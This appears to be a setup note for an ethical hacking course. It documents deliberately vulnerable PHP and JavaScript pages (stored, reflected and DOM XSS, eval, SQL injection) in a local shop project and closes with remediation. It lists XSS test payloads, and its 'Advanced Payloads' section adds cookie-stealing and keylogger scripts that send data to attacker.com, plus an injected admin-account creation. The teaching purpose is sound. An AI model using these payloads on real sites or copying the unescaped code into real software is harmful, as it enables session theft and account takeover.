# ⚠️ XSS Vulnerability Setup Complete

## Created Vulnerable Components for Educational Testing

This setup includes **6 major XSS vulnerabilities** across different attack vectors:

### Quick Test Links

| Vulnerability | Type | Link | Test Payload |
|---|---|---|---|
| Contact Form | Stored XSS | `pages/contact-us.php` | `<img src=x onerror="alert('XSS')">` |
| Admin Messages | Stored XSS Display | `admin/messages_vulnerable.php` | View any stored payload |
| Search Page | Reflected XSS | `admin/search_vulnerable.php?q=<img src=x onerror="alert('XSS')">` | In URL parameter |
| DOM Demo | DOM-based XSS | `admin/dom_xss_demo.html?username=<script>alert('XSS')</script>` | URL params |
| Comment System | DOM-based XSS | `admin/dom_xss_demo.html` | Type in comment box |
| Eval Demo | Code Execution | `admin/dom_xss_demo.html` | Type JavaScript in expression field |

---

## Modified Files

1. **[pages/contact-us.php](../../pages/contact-us.php)**
   - Added vulnerable form processing
   - No input validation
   - Direct database insertion (SQL injection + XSS)
   - Reflected XSS in success message
   - GET parameter reflection vulnerability

2. **Created: [_dev-tools/create_vulnerable_contact_table.php](_dev_tools/create_vulnerable_contact_table.php)**
   - Sets up contact_messages table
   - No constraints or validation

3. **Created: [admin/messages_vulnerable.php](admin/messages_vulnerable.php)**
   - Displays stored messages without escaping
   - No authentication
   - All fields are vulnerable (name, email, subject, message)

4. **Created: [admin/search_vulnerable.php](admin/search_vulnerable.php)**
   - Reflects search query multiple times
   - No sanitization
   - No authentication

5. **Created: [admin/dom_xss_demo.html](admin/dom_xss_demo.html)**
   - Multiple DOM XSS demonstrations
   - innerHTML with unsanitized data
   - eval() with user input
   - Comment submission without sanitization

6. **Created: [Js/dom_xss_vulnerable.js](Js/dom_xss_vulnerable.js)**
   - Vulnerable client-side functions
   - innerHTML manipulation
   - eval() examples
   - DOM clobbering possibilities

---

## Step-by-Step Testing Guide

### 1. Initial Setup
```bash
# Navigate to setup script
http://localhost/PeakPH_Commerce/_dev-tools/create_vulnerable_contact_table.php
# Creates contact_messages table
```

### 2. Test Stored XSS
```
1. Go to: http://localhost/PeakPH_Commerce/pages/contact-us.php
2. Enter in Name field: <img src=x onerror="alert('Stored XSS')">
3. Fill other fields with dummy data
4. Submit form
5. View at: http://localhost/PeakPH_Commerce/admin/messages_vulnerable.php
6. JavaScript executes when page loads
```

### 3. Test Reflected XSS
```
1. Go to: http://localhost/PeakPH_Commerce/pages/contact-us.php?msg=<script>alert('Reflected XSS')</script>
2. Message displays with script embedded
3. Script executes immediately
```

### 4. Test Admin Search Reflected XSS
```
http://localhost/PeakPH_Commerce/admin/search_vulnerable.php?q=<img src=x onerror="alert('Search XSS')">
```

### 5. Test DOM-based XSS
```
http://localhost/PeakPH_Commerce/admin/dom_xss_demo.html?username=<svg/onload=alert('DOM%20XSS')>&bio=<script>alert('Bio')</script>
```

---

## Vulnerability Summary

### Type 1: Stored XSS (Database)
- **Vector**: Contact form input
- **Storage**: MySQL database (contact_messages table)
- **Display**: Admin messages page without escaping
- **Impact**: Affects all users viewing the message
- **Files**: contact-us.php, messages_vulnerable.php

### Type 2: Reflected XSS (HTTP Response)
- **Vector 1**: Contact form success message
- **Vector 2**: Search parameter (?q=)
- **Impact**: Requires victim to click malicious link
- **Files**: contact-us.php, search_vulnerable.php

### Type 3: DOM-based XSS (Client-side)
- **Vector 1**: URL parameters processed by JavaScript
- **Vector 2**: innerHTML with unsanitized data
- **Vector 3**: eval() with user input
- **Impact**: Executes in user's browser context
- **Files**: dom_xss_demo.html, dom_xss_vulnerable.js

---

## Attack Vectors to Test

### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Advanced Payloads
```html
<!-- Cookie stealing -->
<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">

<!-- Session hijacking -->
<script>
  fetch('/api/admin/create_user', {
    method: 'POST',
    body: JSON.stringify({username: 'hacker', password: 'pass', role: 'admin'})
  });
</script>

<!-- Redirect -->
<script>window.location='http://attacker.com/phishing';</script>

<!-- Keylogger -->
<script>
  document.onkeypress = e => fetch('http://attacker.com/key?k='+e.key);
</script>
```

### Event Handler Bypasses
```html
"/><img src=x onerror=alert('XSS')>
'><img src=x onerror=alert('XSS')>
<img src=x onerror="alert(`XSS`)">
<img src=x onerror='alert("XSS")'>
```

---

## How to Fix (After Testing)

### 1. Output Encoding
```php
// Before: VULNERABLE
echo $_POST['name'];

// After: SAFE
echo htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
```

### 2. Prepared Statements
```php
// Before: VULNERABLE
$sql = "INSERT INTO contact_messages (name) VALUES ('" . $_POST['name'] . "')";

// After: SAFE
$stmt = $conn->prepare("INSERT INTO contact_messages (name) VALUES (?)");
$stmt->bind_param("s", $_POST['name']);
$stmt->execute();
```

### 3. DOM Safety
```javascript
// Before: VULNERABLE
document.getElementById('output').innerHTML = userInput;

// After: SAFE
document.getElementById('output').textContent = userInput;
```

### 4. Input Validation
```php
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
$phone = preg_match('/^\d{10,11}$/', $_POST['phone']) ? $_POST['phone'] : null;
```

### 5. Content Security Policy
```html
<meta http-equiv="Content-Security-Policy" content="
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src *;
  default-src 'self'
">
```

---

## Documentation

For complete testing guide and exploitation techniques, see:
📄 [docs/XSS_VULNERABILITY_GUIDE.md](docs/XSS_VULNERABILITY_GUIDE.md)

---

## ⚠️ CRITICAL WARNINGS

- ✗ **DO NOT** deploy this code to production
- ✗ **DO NOT** use on live/public servers
- ✗ **DO NOT** test on systems you don't own
- ✗ **DO NOT** share malicious payloads targeting real sites
- ✓ **DO** use only in local development for education
- ✓ **DO** understand the legal implications
- ✓ **DO** apply lessons to secure your own code
- ✓ **DO** fix these vulnerabilities after testing

---

## Learning Objectives

After exploiting these vulnerabilities, you will understand:

1. How XSS vulnerabilities are introduced
2. Different types of XSS attacks
3. Impact on users and organizations
4. How to craft XSS payloads
5. How to identify vulnerabilities in code
6. Proper remediation techniques
7. Defense-in-depth strategies

---

**Created**: June 2026  
**Purpose**: Ethical Hacking Course - Educational Testing  
**Status**: INTENTIONALLY VULNERABLE - For Testing Only
